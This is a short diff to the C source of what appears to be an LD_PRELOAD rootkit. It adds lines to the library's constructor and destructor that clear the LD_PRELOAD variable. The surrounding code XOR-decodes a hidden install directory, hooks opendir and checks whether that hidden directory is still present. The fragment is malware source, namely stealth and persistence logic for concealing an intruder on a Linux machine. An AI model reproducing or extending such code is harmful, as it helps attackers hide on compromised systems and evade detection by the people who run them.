@@ -303,6 +303,7 @@
 
 void __attribute ((constructor)) init (void)
 {
+    if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
     char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
     HOOK(old_opendir, COPENDIR);
     DIR *check_presence = old_opendir(install_dir); // does our hidden directory still exist?
@@ -312,6 +313,7 @@ void __attribute ((constructor)) init (void)
 
 void __attribute ((destructor)) vexit (void)
 {
+    if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
     char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
     HOOK(old_opendir, COPENDIR);
     DIR *check_presence = old_opendir(install_dir);
